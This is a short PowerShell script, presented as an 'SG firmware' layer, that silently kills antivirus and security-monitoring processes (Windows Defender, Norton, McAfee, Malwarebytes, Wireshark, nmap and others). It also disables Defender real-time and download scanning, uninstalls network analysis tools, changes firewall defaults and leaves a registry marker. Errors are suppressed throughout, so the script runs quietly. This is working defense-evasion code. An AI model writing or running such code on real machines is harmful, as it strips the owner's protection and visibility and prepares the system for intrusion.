# sg_firmware.ps1 — internet + no bullshit. No security tools. No hacking tools.
$ErrorActionPreference = 'SilentlyContinue'

function FWLog($m) { Write-Host "[sg_firmware] $m" }

function Drop-AllTheTools {
    FWLog 'drop security + hacking tools'
    $procs = @(
        'MsMpEng','MpCmdRun','Norton','McAfee','avp','avast','AVG','Malwarebytes',
        'nmap','wireshark','fiddler','burp','metasploit','hashcat','nc','netcat'
    )
    foreach ($p in $procs) {
        Get-Process -Name $p -EA 0 | Stop-Process -Force
    }
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Set-MpPreference -DisableIOAVProtection $true
    } catch { }
    Get-AppxPackage *nmap*,*wireshark* -EA 0 | Remove-AppxPackage -EA 0
}

function Internet-Only {
    FWLog 'internet out only'
    Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block -DefaultOutboundAction Allow -Enabled True
}

function Invoke-SGFirmware {
    FWLog '=== SG FIRMWARE — internet + no bullshit ==='
    Drop-AllTheTools
    Internet-Only
    New-Item 'HKLM:\SOFTWARE\SGBuild' -Force | Out-Null
    Set-ItemProperty 'HKLM:\SOFTWARE\SGBuild' -Name FirmwareLayer -Value (Get-Date -Format o)
    FWLog 'done'
}